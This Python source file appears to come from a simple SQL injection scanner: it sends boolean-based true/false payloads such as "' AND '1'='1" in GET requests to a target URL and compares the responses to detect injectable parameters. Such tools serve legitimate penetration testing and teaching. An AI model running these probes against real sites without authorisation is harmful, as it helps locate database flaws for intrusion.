from url_utils import construct_test_url
from response_analyzer import analyze_response
import requests

# SQL injection payloads for testing
test_1_payloads = [" AND 1=1", "' AND '1'='1", '" AND "1"="1']
test_2_payloads = [" AND 1=2", "' AND '1'='2", '" AND "1"="2']


# Send an HTTP GET request with a SQL payload and return the response
def send_payload(target_url):
    return requests.get(target_url).text


# Perform SQL injection tests
def test_sql_injection(target_url, id_value):
    # Get the default response
    print(f"Testing default request: {target_url}")
    default_response = send_payload(target_url)
    print("Default response length:", len(default_response))

    # Test 1: Sending "True" payloads
    print("\nTesting with True conditions (Test 1):")
    for payload in test_1_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)
        analyze_response(default_response, response, payload)

    # Test 2: Sending "False" payloads
    print("\nTesting with False conditions (Test 2):")
    for payload in test_2_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)
        analyze_response(default_response, response, payload)
